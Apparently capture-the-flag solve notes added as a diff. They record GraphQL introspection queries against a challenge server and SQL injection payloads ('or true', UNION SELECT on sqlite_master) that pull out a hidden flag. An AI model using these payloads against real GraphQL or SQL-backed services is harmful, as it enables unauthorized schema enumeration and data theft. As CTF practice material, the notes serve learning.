@@ -1,0 +1,32 @@
+Dump Graphql :
+
+http://207.180.200.166:8080/graphql?query={__schema{types{name,fields{name}}}}
+
+or
+
+http://207.180.200.166:8080/graphql?query={__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}}
+
+`
+allNotes, allUsers, coolNotes, getNote(q:), CreateNote
+NoteObject(5) : uuid, title, body, authorId, author (UserObject), id
+UserObject(3) : uuid, username, notes (NoteObjectConnection), id
+`
+
+http://207.180.200.166:8080/graphql?query={coolNotes{id,uuid,title,body,authorId,author{id,username}}} # we got fake flag
+http://207.180.200.166:8080/graphql?query={getNote(q:"433"){id,uuid,title}}
+
+or 
+
+{allUsers(before: "10000") {edges {node {id,uuid,username,notes{edges {node {id,uuid,title,body}}}}}}}
+
+
+SQL Injection : 
+
+http://207.180.200.166:8080/graphql?query={getNote(q:"' or true--"){id,uuid,title}}
+
+
+{getNote(q:"-1' UNION SELECT 1,2,3,tbl_name FROM sqlite_master;--"){id}}
+{getNote(q:"-1' UNION SELECT 1,2,3,sql FROM sqlite_master;--"){id}}
+{getNote(q:"-1' UNION SELECT 1,2,3,flag FROM '\u0627\u0644\u0639\u0644\u0645';--"){id}}
+
+# flag{h0p3_u_can't_r3@d_1t9176}
